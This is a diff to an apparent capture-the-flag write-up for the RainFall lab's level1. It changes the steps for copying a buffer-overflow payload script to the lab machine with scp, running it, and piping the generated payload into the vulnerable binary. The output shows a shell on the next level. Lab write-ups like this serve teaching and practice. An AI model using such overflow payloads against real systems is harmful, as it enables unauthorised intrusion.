@@ -27,13 +27,15 @@ To use the exploit, we need to overload the buffer in the `main` function and ov
 Download or clone [payload](./payload.py) to any folder with write access (`/tmp` is a good option) and <br>
 run the following command:
 ```bash
-python /tmp/payload.py
+scp -P 4242 ./level1/payload.py level1@192.168.64.9:/tmp/payload1.py
+
+python /tmp/payload1.py
 ```
 
 This will produce payload file that should be used to exploit the binary:
 
 ```bash
-level1@RainFall:~$ (cat /tmp/payload; cat) | ./level1
+level1@RainFall:~$ (cat /tmp/payload1; cat) | ./level1
 Good... Wait what?
 cd ../level2
 ls -la
